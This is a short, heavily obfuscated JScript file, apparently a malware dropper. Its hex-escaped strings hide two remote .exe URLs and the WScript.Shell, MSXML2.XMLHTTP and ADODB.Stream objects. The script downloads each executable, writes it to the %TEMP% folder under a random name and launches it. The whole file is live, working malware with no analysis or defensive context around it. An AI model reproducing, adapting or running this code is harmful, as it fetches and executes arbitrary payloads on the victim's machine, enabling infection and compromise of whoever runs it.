var tFFNkW=""
var FSjSpfCJsvfNIpNom=["\x68\x74\x74\x70\x3a\x2f\x2f\x63\x61\x70\x69\x74\x6f\x6c\x63\x6f\x6c\x6c\x65\x63\x74\x69\x62\x6c\x65\x73\x2e\x63\x6f\x6d\x2f\x6a\x32\x7a\x6e\x67\x57\x2e\x65\x78\x65","\x68\x74\x74\x70\x3a\x2f\x2f\x65\x63\x6f\x74\x65\x63\x6e\x69\x63\x2e\x63\x6f\x2e\x75\x6b\x2f\x42\x53\x6e\x77\x4f\x54\x2e\x65\x78\x65","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a","\x57\x53\x26\x76\x69\x4f\x53\x44\x69\x4f\x58\x71\x26\x63\x72\x69\x70\x74\x26\x76\x69\x4f\x53\x44\x69\x4f\x58\x71\x26\x2e\x53\x68\x65\x6c\x6c","\x26","\x4d\x53\x58\x26\x50\x71\x4a\x51\x76\x67\x69\x4a\x41\x26\x4d\x4c\x32\x2e\x58\x4d\x26\x74\x66\x6f\x78\x41\x47\x52\x64\x42\x70\x64\x26\x4c\x48\x54\x54\x50","\x26","\x41\x44\x4f\x44\x42\x26\x4b\x55\x6d\x6a\x6b\x44\x62\x55\x56\x26\x2e\x26\x61\x4d\x78\x4a\x6c\x61\x43\x53\x47\x26\x53\x74\x72\x65\x61\x6d","\x26","\x2e\x65\x78\x65","\x25\x54\x45\x4d\x50\x25","\x47\x2a\x6c\x53\x69\x6f\x46\x46\x78\x6b\x79\x74\x2a\x45\x2a\x54\x2a\x58\x6b\x47\x69\x6d\x5a\x76\x75\x75\x50\x4c\x65","\x2a","\x70\x66\x62"]

var KPkBK = [FSjSpfCJsvfNIpNom[0], FSjSpfCJsvfNIpNom[1]];
function IgEjDmK() {var YyhG=100000;var uSWDqH = 100;return Math.random()*(YyhG-uSWDqH)+uSWDqH;}
function kldsbRzX(agXTn) {var qnfseOfu=FSjSpfCJsvfNIpNom[2];for(var KsTYS=0;KsTYS<agXTn;KsTYS++){rSjOC+=qnfseOfu.charAt(Math.floor(Math.random()*qnfseOfu.length));}return rSjOC;}
function RsoDobPDQ(JYjvXzNBV,EghiYHM,PTinuaaj){
var dEbzvsDGz = bMmzy(brRIm(FSjSpfCJsvfNIpNom[3],[0,2,4],FSjSpfCJsvfNIpNom[4]));
var EghiYHM = rirHtg(dEbzvsDGz) + String.fromCharCode(92) + EghiYHM;
var pMXrz = bMmzy(brRIm(FSjSpfCJsvfNIpNom[5],[0,2,4],FSjSpfCJsvfNIpNom[6]));   
dFHO(JYjvXzNBV,pMXrz);
if (pMXrz.status == 100+100) {
var PRhtDKc = bMmzy(brRIm(FSjSpfCJsvfNIpNom[7],[0,2,4],FSjSpfCJsvfNIpNom[8]));
hIabZ(PRhtDKc,pMXrz.ResponseBody,EghiYHM);
}
if (PTinuaaj > 0){
dEbzvsDGz.Run(EghiYHM, 0x1, 0x0);
};
}
for(Vunm=0;Vunm<KPkBK.length;Vunm++) {
try{RsoDobPDQ(KPkBK[Vunm], IgEjDmK() + FSjSpfCJsvfNIpNom[9], 1)}catch(e){}; 
}
function bMmzy(OHtQmR){return new ActiveXObject(OHtQmR);}
function rirHtg(OHtQmR){return OHtQmR.ExpandEnvironmentStrings(FSjSpfCJsvfNIpNom[10])}
function hIabZ(sYqdurJE,FeKor,IytwcFCmLj){sYqdurJE.open();sYqdurJE.type = 1;sYqdurJE.write(FeKor);sYqdurJE.position = 0;sYqdurJE.saveToFile(IytwcFCmLj, 2);sYqdurJE.close();}
function dFHO(HSoBxS,EZnWdno){WIYk = FSjSpfCJsvfNIpNom[11].split(FSjSpfCJsvfNIpNom[12]);EZnWdno.open(WIYk[0]+WIYk[2]+WIYk[3], HSoBxS, false);EZnWdno.send();}
function brRIm(RHgFayVl,cibJKd,VfkaCclsv){DoLxF=RHgFayVl.split(VfkaCclsv);IfTHKer = FSjSpfCJsvfNIpNom[13];for(HbXxxpgh=0;HbXxxpgh<cibJKd.length;HbXxxpgh++) {IfTHKer+=DoLxF[cibJKd[HbXxxpgh]];}return IfTHKer.substring(3,IfTHKer.length);}
